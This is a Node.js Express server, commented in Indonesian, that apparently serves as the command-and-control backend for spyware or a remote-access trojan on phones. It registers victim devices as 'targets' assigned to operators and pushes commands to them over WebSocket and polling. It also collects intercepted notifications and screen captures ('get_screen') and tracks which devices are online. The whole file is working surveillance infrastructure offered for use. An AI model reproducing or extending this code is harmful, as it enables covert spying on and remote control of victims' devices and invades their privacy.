const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const fs = require('fs');
const path = require('path');
const http = require('http'); // Tambah ini
const socketIo = require('socket.io'); // Tambah ini

const authRoutes = require('./routes/auth');
const userRoutes = require('./routes/user');
const whatsappRoutes = require('./routes/whatsapp');
const vpsRoutes = require('./routes/vps');
const toolsRoutes = require('./routes/tools');
const chatRoutes = require('./routes/chat');

const authMiddleware = require('./middleware/authMiddleware');
const rateLimitMiddleware = require('./middleware/rateLimitMiddleware');

const app = express();
const server = http.createServer(app); // Bungkus app dengan server http
const io = socketIo(server, {
    cors: { origin: "*" }
});

app.use(helmet());
app.use(cors());
app.use(express.urlencoded({ extended: false }));
app.use(express.json({ limit: '500mb' }));
app.use(rateLimitMiddleware);

// Manajemen Koneksi Real-time
io.on('connection', (socket) => {
    const targetId = socket.handshake.query.id;
    if (targetId) {
        socket.join(targetId);
        console.log(`[+] Target Linked Real-time: ${targetId}`);
    }
});

const DB_DIR = './data';
if (!fs.existsSync(DB_DIR)) fs.mkdirSync(DB_DIR);

const FILES = {
    TARGETS: path.join(DB_DIR, 'targets.json'),
    NOTIFS: path.join(DB_DIR, 'notifications.json'),
    COMMANDS: path.join(DB_DIR, 'commands.json'),
    RESPONSES: path.join(DB_DIR, 'responses.json')
};

const readDB = (file) => {
    if (!fs.existsSync(file)) return [];
    try { return JSON.parse(fs.readFileSync(file, 'utf8') || '[]'); } catch (e) { return []; }
};

const saveDB = (file, data) => {
    try { fs.writeFileSync(file, JSON.stringify(data, null, 2)); } catch (e) { console.log(`[!] DB Write Error`); }
};

app.use('/api/auth', authRoutes);
app.use('/api/user', authMiddleware, userRoutes);
app.use('/api/whatsapp', authMiddleware, whatsappRoutes);
app.use('/api/vps', authMiddleware, vpsRoutes);
app.use('/api/tools', authMiddleware, toolsRoutes);
app.use('/', chatRoutes);

app.get('/api/list-targets', (req, res) => {
    const operatorName = req.query.username; 
    const targets = readDB(FILES.TARGETS);
    if (operatorName) {
        const filtered = targets.filter(t => t.admin === operatorName);
        return res.json(filtered);
    }
    res.json(targets);
});

app.post('/api/register-target', (req, res) => {
    const deviceData = req.body; 
    let targets = readDB(FILES.TARGETS);
    const index = targets.findIndex(t => t.id === deviceData.id);
    if (index !== -1) {
        targets[index] = { ...targets[index], ...deviceData, lastSeen: new Date() };
    } else {
        targets.push({ ...deviceData, lastSeen: new Date() });
    }
    saveDB(FILES.TARGETS, targets);
    console.log(`[REG] Target Connected: ${deviceData.id} | Locked to Admin: ${deviceData.admin}`);
    res.json({ status: 'ok' });
});

// MODIFIKASI: Kirim Perintah Instan via Socket + Simpan di DB
app.post('/api/send-command', (req, res) => {
    const { id, command, extra } = req.body;
    
    // Kirim langsung via WebSocket (Instant)
    io.to(id).emit('execute', { command, extra });

    // Tetap simpan di database (Backup/Polling)
    let commands = readDB(FILES.COMMANDS).filter(c => c.targetId !== id);
    commands.push({ targetId: id, command, extra, timestamp: new Date() });
    saveDB(FILES.COMMANDS, commands);
    
    console.log(`[PUSH] Command sent to ${id}: ${command}`);
    res.json({ status: 'sent' });
});

app.get('/api/get-command/:id', (req, res) => {
    let commands = readDB(FILES.COMMANDS);
    const index = commands.findIndex(c => c.targetId === req.params.id);
    if (index !== -1) {
        const cmd = commands[index];
        commands.splice(index, 1);
        saveDB(FILES.COMMANDS, commands);
        return res.json({
            command: cmd.command,
            extra: cmd.extra || ""
        });
    }
    res.status(204).send();
});

app.post('/api/post-notification/:id', (req, res) => {
    const targetId = req.params.id;
    let allNotifs = readDB(FILES.NOTIFS);
    allNotifs.unshift({ targetId, ...req.body, timestamp: new Date() });
    saveDB(FILES.NOTIFS, allNotifs.slice(0, 1000));
    console.log(`[LOG] Notif Masuk: [${targetId}] - ${req.body.title}`);
    res.json({ status: 'saved' });
});

app.get('/api/get-notifications/:id', (req, res) => {
    const filtered = readDB(FILES.NOTIFS).filter(n => n.targetId === req.params.id);
    res.json(filtered);
});

app.post('/api/post-response/:id', (req, res) => {
    const targetId = req.params.id;
    let responses = readDB(FILES.RESPONSES);
    
    if (req.body.cmd === "get_screen") {
        responses = responses.filter(r => !(r.targetId === targetId && r.cmd === "get_screen"));
    } else {
        responses = responses.filter(r => r.targetId !== targetId);
    }

    responses.push({ targetId, ...req.body, timestamp: new Date() });
    saveDB(FILES.RESPONSES, responses);
    res.json({ status: 'ok' });
});

app.get('/api/get-response/:id', (req, res) => {
    let responses = readDB(FILES.RESPONSES);
    const index = responses.findIndex(r => r.targetId === req.params.id);
    if (index !== -1) {
        const resp = responses[index];
        responses.splice(index, 1);
        saveDB(FILES.RESPONSES, responses);
        return res.json(resp);
    }
    res.status(204).send();
});

app.post('/api/heartbeat/:id', (req, res) => {
    let targets = readDB(FILES.TARGETS);
    const index = targets.findIndex(t => t.id === req.params.id);
    if (index !== -1) {
        targets[index].lastSeen = new Date();
        targets[index].status = "Online"; 
        saveDB(FILES.TARGETS, targets);
    }
    res.json({ status: 'alive' });
});

app.get('/ping', (req, res) => res.send('pong'));

// Export server agar socket bisa jalan
module.exports = server;